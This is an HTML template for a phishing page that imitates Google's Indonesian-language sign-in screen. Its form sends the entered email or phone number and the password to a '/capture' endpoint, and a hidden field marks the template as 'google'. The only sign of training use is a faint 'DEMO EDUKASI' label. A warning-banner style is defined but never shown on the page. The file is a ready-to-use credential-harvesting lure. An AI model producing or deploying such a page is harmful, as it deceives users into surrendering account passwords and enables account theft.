<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google - Masuk</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh;justify-content:center}
.demo-banner{background:#dc2626;color:#fff;text-align:center;padding:8px;font-size:13px;font-weight:bold;position:fixed;top:0;left:0;right:0;z-index:999}
.card{width:400px;padding:40px;border:1px solid #dadce0;border-radius:8px;margin-top:40px}
.logo{text-align:center;margin-bottom:20px;font-size:28px;color:#5f6368}
.logo span{color:#4285f4;font-weight:bold}
.logo span:nth-child(2){color:#ea4335}
.logo span:nth-child(3){color:#fbbc05}
.logo span:nth-child(4){color:#4285f4}
.logo span:nth-child(5){color:#34a853}
.logo span:nth-child(6){color:#ea4335}
h1{font-size:24px;text-align:center;margin-bottom:8px;font-weight:400}
.sub{text-align:center;color:#5f6368;font-size:14px;margin-bottom:30px}
.form-group{margin-bottom:20px}
.form-group input{width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
.form-group input:focus{outline:none;border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,0.2)}
.btn{width:100%;padding:10px 20px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:bold;cursor:pointer;float:right;width:auto}
.btn:hover{background:#1558b0}
.btn-wrap{overflow:auto;margin-top:20px}
.footer{text-align:center;margin-top:30px;font-size:12px;color:#5f6368}
.footer a{color:#1a73e8;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
</div>
<h1>Masuk</h1>
<p class="sub">Gunakan Akun Google Anda</p>
<form action="/capture" method="POST">
<input type="hidden" name="template" value="google">
<div class="form-group">
<input type="text" name="username" placeholder="Email atau nomor telepon" required>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<div class="btn-wrap">
<button type="submit" class="btn">Berikutnya</button>
</div>
</form>
</div>
<div class="footer">
<a href="#">Lupa email?</a> &middot; <a href="#">Daftar</a>
</div>
<p style="position:fixed;bottom:5px;right:10px;font-size:10px;color:rgba(220,38,38,0.3);font-weight:bold">🔬 DEMO EDUKASI</p>
</body>
</html>
